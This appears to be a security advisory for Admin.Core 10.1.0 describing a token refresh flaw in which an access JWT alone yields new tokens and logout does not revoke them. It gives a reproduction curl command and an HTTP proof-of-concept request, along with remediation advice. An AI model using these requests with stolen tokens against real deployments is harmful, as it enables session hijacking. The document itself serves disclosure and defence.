# Admin.Core — Access JWT alone refreshes session without server revocation (AC-VULN-010)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Improper Authentication |
| CWE | CWE-613 / CWE-384 |
| Authentication | Knowledge of access JWT (including expired within refresh window) |
| Severity | High |

## Summary

`AuthService.Refresh` accepts the access JWT via query `token` without validating a server-side refresh store; force-offline does not blacklist JWTs.

## Root cause

Stateless refresh based on JWT claims only; no revocation list.

## Exploit / reproduction

```bash
curl -s 'http://127.0.0.1:18010/api/admin/auth/refresh?token=ACCESS_JWT'
```


## PoC (Yakit)

```http
GET /api/admin/auth/refresh?token=ACCESS_JWT HTTP/1.1
Host: 127.0.0.1:18010
Connection: close
```

Expected: HTTP 200; new accessToken issued without Authorization header

## Screenshots

Dynamic verify: `/api/admin/auth/refresh?token=` returns new accessToken.

## Impact

Stolen tokens remain usable until refresh window ends despite logout/force-offline.

## Remediation

Server-side refresh tokens; rotate+revoke; short access TTL; jti blacklist on offline.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
